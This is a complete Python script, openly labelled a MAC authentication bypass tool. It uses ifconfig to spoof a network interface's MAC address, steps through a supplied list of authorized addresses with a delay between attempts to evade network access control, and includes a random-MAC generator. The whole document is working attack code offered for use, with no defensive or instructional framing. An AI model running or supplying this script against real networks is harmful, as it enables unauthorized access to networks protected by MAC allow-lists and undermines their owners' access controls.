#!/usr/bin/env python3

import os
import sys
import subprocess
import random
import time

def change_mac(interface, new_mac):
    """
    Change the MAC address of the specified network interface.
    """
    try:
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.call(["ifconfig", interface, "up"])
        print(f"[*] MAC address changed to {new_mac} on {interface}")
    except Exception as e:
        print(f"[!] Error changing MAC address: {e}")

def generate_random_mac():
    """
    Generate a random MAC address (for fallback or testing purposes).
    """
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def attempt_bypass(interface, mac_list, delay=5):
    """
    Attempt to bypass NAC by cycling through a list of authorized MAC addresses.
    """
    for mac in mac_list:
        print(f"[*] Attempting to bypass with MAC: {mac}")
        change_mac(interface, mac)
        print("[*] Sleeping for a while to allow NAC system to process...")
        time.sleep(delay)  # Wait before trying the next MAC address

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="MAC Authentication Bypass Script")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for the attack")
    parser.add_argument("-m", "--mac-list", required=True, nargs="+", help="List of authorized MAC addresses to spoof")
    parser.add_argument("-d", "--delay", type=int, default=5, help="Delay (in seconds) between attempts")

    args = parser.parse_args()

    # Validate if running with root privileges
    if os.geteuid() != 0:
        sys.exit("[!] Please run this script as root or with sudo.")

    # Start the bypass attempt
    attempt_bypass(args.interface, args.mac_list, args.delay)